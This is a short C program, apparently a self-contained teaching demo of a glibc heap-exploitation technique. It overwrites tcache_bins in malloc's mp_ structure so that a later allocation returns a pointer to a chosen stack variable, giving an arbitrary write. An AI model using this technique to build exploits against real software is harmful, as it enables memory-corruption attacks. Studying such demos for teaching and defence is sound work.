#include <stdio.h>
#include <stdlib.h>

static unsigned long ofs_libc_malloc	= 0x09d260;
static unsigned long ofs_libc_mp 	= 0x1eb280;

int main(void){
	unsigned long addr_libc_base;
	void *mp_;	// malloc_per
	size_t *tcache_bins;

	addr_libc_base = (unsigned long)malloc - ofs_libc_malloc;
	mp_ = (void*)(addr_libc_base + ofs_libc_mp);
	tcache_bins = mp_ + 0x50;

	setbuf(stdout, NULL);
	printf("mp_ : %p (tcache_bins = %#lx)\n\n", mp_, *tcache_bins);

	unsigned long *m, *victim;
	unsigned long var = 0xdeadbeef;

	printf("&var   : %p\nvar    = %#lx\n\n", &var, var);

	m = malloc(8);
	*m = (unsigned long)&var;
	free(malloc(0x18));

	puts("Exploit!");
	*tcache_bins = 0xc0bebeef;	// vuln
	victim = malloc(0x438);		// alloc var from tcache
	*victim = 0xcafebabe;		// overwrite

	printf("victim = %p\nvar    = %#lx\n", victim, var);
}
